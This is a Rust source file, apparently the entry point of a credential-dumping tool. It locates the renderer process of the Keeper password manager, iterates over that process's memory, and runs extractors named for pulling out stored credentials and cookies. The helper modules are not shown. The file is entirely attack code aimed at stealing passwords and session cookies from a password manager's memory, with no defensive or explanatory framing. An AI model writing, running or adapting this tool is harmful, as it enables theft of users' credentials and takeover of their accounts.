fn main() -> std::io::Result<()> {
    println!("[i] Getting target PID");
    let process_id = match enumerate::get_program_pid("keeperpasswordmanager.exe", Some(r"--renderer-client-id=4")) {
        Some(pid) => {
            println!("[+] Keeper target PID Found: {}", pid);
            pid
        }
        None => {
            println!("[-] Could not find target PID");

            return Ok(());
        }
    };

    let extractors: &[fn(&str)] = &[
        extract::extract_credentials,
        extract::extract_cookies,
    ];

    println!("[i] Iterating over memory");
    let _ = dump::iterate_over_mem(process_id.as_u32(), extractors);

    Ok(())
}
